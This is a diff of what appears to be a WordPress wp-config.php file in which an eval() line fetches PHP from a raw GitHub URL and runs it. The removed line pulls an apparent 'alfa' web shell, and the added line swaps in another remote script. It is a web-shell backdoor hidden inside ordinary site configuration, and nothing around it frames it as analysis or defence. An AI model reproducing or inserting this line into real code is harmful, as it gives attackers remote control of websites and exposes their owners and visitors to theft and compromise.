@@ -78,7 +78,7 @@ function get($url) {
       return $data;
   }
   $x= '?>';
-         eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/0root-alfa.php" ) ) ); ?>
+         eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/root.php" ) ) ); ?>
 
 /**
  * For developers: WordPress debugging mode.
@@ -104,5 +104,6 @@ define( 'WP_DEBUG', false );
 if ( ! defined( 'ABSPATH' ) ) {
         define( 'ABSPATH', __DIR__ . '/' );
 }
+
 
 /** Sets up WordPress vars and included files. */
